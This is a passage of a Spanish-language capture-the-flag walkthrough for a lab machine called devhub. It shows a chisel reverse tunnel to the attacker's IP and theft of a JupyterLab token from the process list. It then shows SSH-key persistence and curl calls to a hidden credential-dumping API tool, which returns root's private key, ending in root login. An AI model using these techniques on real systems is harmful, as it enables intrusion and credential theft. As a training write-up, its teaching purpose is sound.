+drwxr-x--- 4 mcp-dev mcp-dev 4.0K May 27 12:22 mcp-dev</code></pre>
+
+                <p>Bajo <code>/opt/opsmcp</code>, hay un script Python que de momento no puedo leer como <code>mcp-dev</code>:</p>
+
+                <pre data-lang="plaintext"><code>-rw-r----- 1 analyst analyst 5.9K Mar 16 21:49 server.py</code></pre>
+
+                <p>Comprobando los servicios que escuchan localmente, encuentro los puertos <code>5000</code> y <code>8888</code> abiertos. El puerto 8888 es el entorno de analítica que se mencionaba en la web del puerto 80, y el 5000 parece ser la API del <code>server.py</code>:</p>
+
+                <pre data-lang="plaintext"><code>tcp  LISTEN  0  128  127.0.0.1:5000  0.0.0.0:*
+tcp  LISTEN  0  128  127.0.0.1:8888</code></pre>
+
+                <pre data-lang="bash"><code>mcp-dev@devhub:~$ <span class="nb">curl</span> localhost:5000
+{<span class="key">"auth"</span>:<span class="st">"Required - X-API-Key header"</span>,<span class="key">"endpoints"</span>:[<span class="st">"/tools/list"</span>,<span class="st">"/tools/call"</span>,<span class="st">"/health"</span>],<span class="key">"server"</span>:<span class="st">"OPSMCP"</span>,<span class="key">"status"</span>:<span class="st">"operational"</span>,<span class="key">"version"</span>:<span class="st">"2.1.0"</span>}</code></pre>
+
+                <h2>Exposición del Token de JupyterLab</h2>
+                <p>Ejecutando <code>ps</code> con la salida completa de la línea de comandos, veo que el usuario <code>analyst</code> está ejecutando JupyterLab en el puerto 8888, y lo más crítico: <strong>el token de autenticación es visible en los argumentos del proceso</strong>:</p>
+
+                <pre data-lang="bash"><code>mcp-dev@devhub:~$ <span class="nb">ps</span> -fauxww | grep analyst
+analyst  1104  0.1  2.4 182524 96440 ?  Ss  10:35  0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=<span class="va">a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</span> --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+root     1110  0.0  0.7  37376 28768 ?  Ss  10:35  0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py</code></pre>
+
+                <p>También noto que <code>server.py</code> se ejecuta como <strong>root</strong>, lo cual será relevante para la escalada de privilegios.</p>
+
+                <p>Para acceder a la interfaz de JupyterLab desde mi navegador, transfiero <code>chisel</code> a la máquina víctima y configuro el port forwarding:</p>
+
+                <pre data-lang="bash"><code><span class="cm"># Máquina atacante</span>
+└─$ ./chisel server -p 1234 --reverse
+
+<span class="cm"># Máquina víctima</span>
+mcp-dev@devhub:~$ ./chisel client 10.10.14.104:1234 R:8888:127.0.0.1:8888</code></pre>
+
+                <p>Navegando a <code>http://localhost:8888</code> en mi navegador, veo la interfaz de login de JupyterLab solicitando un token:</p>
+                <p><img src="./media/image3.png" alt="Interfaz de login de JupyterLab con un campo de entrada de token para la autenticación" /></p>
+
+                <p>Como ya tengo el token porque lo vi en la lista de procesos, lo introduzco y gano acceso completo a JupyterLab.</p>
+
+                <h2>Movimiento Lateral a analyst</h2>
+                <p>Desde JupyterLab, puedo abrir un terminal directamente como el usuario <code>analyst</code>:</p>
+                <p><img src="./media/image1.png" alt="Terminal de JupyterLab abierto como el usuario analyst mostrando las opciones de shell disponibles" /></p>
+
+                <p>Consigo la flag de usuario desde aquí. Para establecer persistencia, simplemente añado mi clave pública SSH al archivo <code>~/.ssh/authorized_keys</code> del usuario <code>analyst</code> a través del terminal de JupyterLab, y después me conecto mediante SSH para tener una shell en condiciones.</p>
+
+                <h2>Escalada de Privilegios - Análisis de API y Exposición de Credenciales</h2>
+                <p>Una vez logueado como <code>analyst</code> vía SSH, encuentro un archivo interesante en su directorio home:</p>
+
+                <pre data-lang="bash"><code>analyst@devhub:~$ <span class="nb">cat</span> .opsmcp_key
+opsmcp_secret_key_4f5a6b7c8d9e0f1a</code></pre>
+
+                <p>Esta es la API key para el servidor OPSMCP que se ejecuta como root en el puerto 5000. Ahora que soy <code>analyst</code>, también puedo leer el código fuente de <code>server.py</code> en <code>/opt/opsmcp/server.py</code>. Puedo verificar rápidamente que la API key funciona listando las herramientas disponibles:</p>
+
+                <pre data-lang="bash"><code><span class="nb">curl</span> -X POST localhost:5000/tools/call \
+  -H <span class="st">"X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span> \
+  -H <span class="st">"Content-Type: application/json"</span> \
+  -d <span class="st">'{"name": "ops.list_services"}'</span></code></pre>
+
+                <pre data-lang="json"><code>{<span class="key">"services"</span>:[
+  {<span class="key">"name"</span>:<span class="st">"nginx"</span>,<span class="key">"pid"</span>:<span class="nu">1234</span>,<span class="key">"status"</span>:<span class="st">"running"</span>},
+  {<span class="key">"name"</span>:<span class="st">"opsmcp"</span>,<span class="key">"pid"</span>:<span class="nu">5678</span>,<span class="key">"status"</span>:<span class="st">"running"</span>},
+  {<span class="key">"name"</span>:<span class="st">"jupyter"</span>,<span class="key">"pid"</span>:<span class="nu">9012</span>,<span class="key">"status"</span>:<span class="st">"running"</span>},
+  {<span class="key">"name"</span>:<span class="st">"mcpjam"</span>,<span class="key">"pid"</span>:<span class="nu">3456</span>,<span class="key">"status"</span>:<span class="st">"running"</span>}
+]}</code></pre>
+
+                <h3>Analizando server.py</h3>
+                <p>El código fuente del servidor API revela el panorama completo. A continuación muestro el contenido relevante (he eliminado las implementaciones de las herramientas visibles no críticas por brevedad — eran <code>ops.system_status</code>, <code>ops.list_services</code>, <code>ops.check_disk</code> y <code>ops.view_logs</code>):</p>
+
+                <pre data-lang="python"><code><span class="cm">#!/usr/bin/env python3</span>
+<span class="st">"""
+OPSMCP - Operations MCP Server
+Internal tool for system operations management
+"""</span>
+<span class="kw">from</span> flask <span class="kw">import</span> Flask, jsonify, request
+<span class="kw">import</span> os
+
+app = <span class="fn">Flask</span>(<span class="va">__name__</span>)
+
+<span class="cm"># API Key for authentication</span>
+<span class="va">VALID_API_KEY</span> = <span class="st">"opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span>
+
+<span class="cm"># Registered tools (visible)</span>
+<span class="va">VISIBLE_TOOLS</span> = {
+    <span class="st">"ops.system_status"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Get system status and health metrics"</span>,
+        <span class="st">"parameters"</span>: {}
+    },
+    <span class="st">"ops.list_services"</span>: {
+        <span class="st">"description"</span>: <span class="st">"List running services"</span>,
+        <span class="st">"parameters"</span>: {}
+    },
+    <span class="st">"ops.check_disk"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Check disk usage"</span>,
+        <span class="st">"parameters"</span>: {}
+    },
+    <span class="st">"ops.view_logs"</span>: {
+        <span class="st">"description"</span>: <span class="st">"View recent system logs"</span>,
+        <span class="st">"parameters"</span>: {<span class="st">"service"</span>: <span class="st">"string"</span>}
+    }
+}
+
+<span class="cm"># Hidden tools (not in /tools/list but callable)</span>
+<span class="va">HIDDEN_TOOLS</span> = {
+    <span class="st">"ops._admin_dump"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Emergency credential dump - INTERNAL ONLY"</span>,
+        <span class="st">"parameters"</span>: {<span class="st">"target"</span>: <span class="st">"string"</span>, <span class="st">"confirm"</span>: <span class="st">"boolean"</span>}
+    },
+    <span class="st">"ops._debug_mode"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Enable debug mode"</span>,
+        <span class="st">"parameters"</span>: {}
+    }
+}
+
+<span class="va">ALL_TOOLS</span> = {**<span class="va">VISIBLE_TOOLS</span>, **<span class="va">HIDDEN_TOOLS</span>}
+
+<span class="kw">def</span> <span class="fn">check_auth</span>():
+    <span class="st">"""Check API key authentication"""</span>
+    api_key = request.headers.<span class="fn">get</span>(<span class="st">'X-API-Key'</span>, <span class="st">''</span>)
+    <span class="kw">return</span> api_key == <span class="va">VALID_API_KEY</span>
+
+<span class="dt">@app.route</span>(<span class="st">'/'</span>)
+<span class="kw">def</span> <span class="fn">index</span>():
+    <span class="kw">return</span> <span class="fn">jsonify</span>({
+        <span class="st">"server"</span>: <span class="st">"OPSMCP"</span>,
+        <span class="st">"version"</span>: <span class="st">"2.1.0"</span>,
+        <span class="st">"status"</span>: <span class="st">"operational"</span>,
+        <span class="st">"endpoints"</span>: [<span class="st">"/tools/list"</span>, <span class="st">"/tools/call"</span>, <span class="st">"/health"</span>],
+        <span class="st">"auth"</span>: <span class="st">"Required - X-API-Key header"</span>
+    })
+
+<span class="dt">@app.route</span>(<span class="st">'/tools/call'</span>, methods=[<span class="st">'POST'</span>])
+<span class="kw">def</span> <span class="fn">call_tool</span>():
+    <span class="kw">if not</span> <span class="fn">check_auth</span>():
+        <span class="kw">return</span> <span class="fn">jsonify</span>({<span class="st">"error"</span>: <span class="st">"Unauthorized"</span>}), <span class="nu">401</span>
+
+    data = request.<span class="fn">get_json</span>() <span class="kw">or</span> {}
+    tool_name = data.<span class="fn">get</span>(<span class="st">'name'</span>, <span class="st">''</span>)
+    args = data.<span class="fn">get</span>(<span class="st">'arguments'</span>, {})
+
+    <span class="kw">if</span> tool_name == <span class="st">"ops._admin_dump"</span>:
+        target = args.<span class="fn">get</span>(<span class="st">'target'</span>, <span class="st">''</span>)
+        confirm = args.<span class="fn">get</span>(<span class="st">'confirm'</span>, <span class="bool">False</span>)
+        <span class="kw">if not</span> confirm:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"error"</span>: <span class="st">"Confirmation required"</span>,
+                <span class="st">"usage"</span>: <span class="st">"Set confirm=true to proceed"</span>,
+                <span class="st">"warning"</span>: <span class="st">"This dumps sensitive credentials"</span>
+            })
+        <span class="kw">if</span> target == <span class="st">"ssh_keys"</span>:
+            <span class="kw">try</span>:
+                <span class="kw">with</span> <span class="nb">open</span>(<span class="st">'/root/.ssh/id_rsa'</span>, <span class="st">'r'</span>) <span class="kw">as</span> f:
+                    key_data = f.<span class="fn">read</span>()
+                <span class="kw">return</span> <span class="fn">jsonify</span>({
+                    <span class="st">"target"</span>: <span class="st">"ssh_keys"</span>,
+                    <span class="st">"root_private_key"</span>: key_data,
+                    <span class="st">"note"</span>: <span class="st">"Emergency recovery key dump"</span>
+                })
+            <span class="kw">except</span> <span class="nb">Exception</span> <span class="kw">as</span> e:
+                <span class="kw">return</span> <span class="fn">jsonify</span>({<span class="st">"error"</span>: <span class="kw">f</span><span class="st">"Could not read key: {<span class="fn">str</span>(e)}"</span>})
+        <span class="kw">elif</span> target == <span class="st">"passwords"</span>:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"target"</span>: <span class="st">"passwords"</span>,
+                <span class="st">"dump"</span>: {
+                    <span class="st">"root"</span>: <span class="st">"$6$rounds=656000$saltsalt$hashedpassword"</span>,
+                    <span class="st">"analyst"</span>: <span class="st">"JupyterN0tebook!2026"</span>,
+                    <span class="st">"mcp-dev"</span>: <span class="st">"Mcp!Insp3ct0r2026"</span>
+                }
+            })
+        <span class="kw">elif</span> target == <span class="st">"tokens"</span>:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"target"</span>: <span class="st">"tokens"</span>,
+                <span class="st">"api_tokens"</span>: {
+                    <span class="st">"admin_token"</span>: <span class="st">"opsmcp_admin_7f3b9c2d1e4f5a6b"</span>,
+                    <span class="st">"service_token"</span>: <span class="st">"opsmcp_svc_8c9d0e1f2a3b4c5d"</span>
+                }
+            })
+        <span class="kw">else</span>:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"error"</span>: <span class="st">"Invalid target"</span>,
+                <span class="st">"valid_targets"</span>: [<span class="st">"ssh_keys"</span>, <span class="st">"passwords"</span>, <span class="st">"tokens"</span>]
+            })
+
+<span class="kw">if</span> <span class="va">__name__</span> == <span class="st">'__main__'</span>:
+    app.<span class="fn">run</span>(host=<span class="st">'127.0.0.1'</span>, port=<span class="nu">5000</span>, debug=<span class="bool">False</span>)</code></pre>
+
+                <p>Los puntos clave de este código son:</p>
+                <ul>
+                    <li>La API key está hardcodeada como <code>VALID_API_KEY</code> — coincide con la encontrada en <code>.opsmcp_key</code></li>
+                    <li>Hay <strong>herramientas ocultas</strong> definidas en <code>HIDDEN_TOOLS</code> que <strong>no se devuelven</strong> por el endpoint <code>/tools/list</code>, pero que sí son invocables a través de <code>/tools/call</code></li>
+                    <li>La herramienta <code>ops._admin_dump</code> puede volcar claves SSH, contraseñas y tokens. Como el servidor se ejecuta como <strong>root</strong>, tiene acceso a <code>/root/.ssh/id_rsa</code></li>
+                </ul>
+
+                <p>Las contraseñas y tokens devueltos por los targets <code>passwords</code> y <code>tokens</code> no son funcionales (la contraseña de root es un hash falso, y los tokens no otorgan acceso adicional). Sin embargo, el target <code>ssh_keys</code> lee la clave privada real de root del disco.</p>
+
+                <h3>Volcando la Clave SSH de Root</h3>
+                <p>Llamo a la herramienta oculta <code>ops._admin_dump</code> con <code>target: ssh_keys</code> y <code>confirm: true</code>:</p>
+
+                <pre data-lang="bash"><code><span class="nb">curl</span> -X POST localhost:5000/tools/call \
+  -H <span class="st">"X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span> \
+  -H <span class="st">"Content-Type: application/json"</span> \
+  -d <span class="st">'{"name": "ops._admin_dump", "arguments": {"confirm": true, "target": "ssh_keys"}}'</span></code></pre>
+
+                <pre data-lang="json"><code>{<span class="key">"note"</span>:<span class="st">"Emergency recovery key dump"</span>,<span class="key">"root_private_key"</span>:<span class="st">"-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blbn(...)"</span>}</code></pre>
+
+                <p>La API devuelve la clave privada SSH de root. La clave contiene saltos de línea escapados (<code>\n</code>), así que la normalizo con <code>sed</code>:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">echo</span> <span class="st">"-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+(...)
+JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
+\n-----END OPENSSH PRIVATE KEY-----\n"</span> | <span class="nb">sed</span> <span class="st">'s/\\n/\n/g'</span>
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+(...)
+JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npKlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+
+                <p>Guardo esta clave en un archivo, establezco los permisos correctos y me conecto por SSH como root:</p>
+
+                <pre data-lang="bash"><code><span class="nb">chmod</span> 600 root_id_rsa
+<span class="nb">ssh</span> -i root_id_rsa root@devhub.htb</code></pre>
+
+                <p>Gano acceso como root y consigo la flag del sistema.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
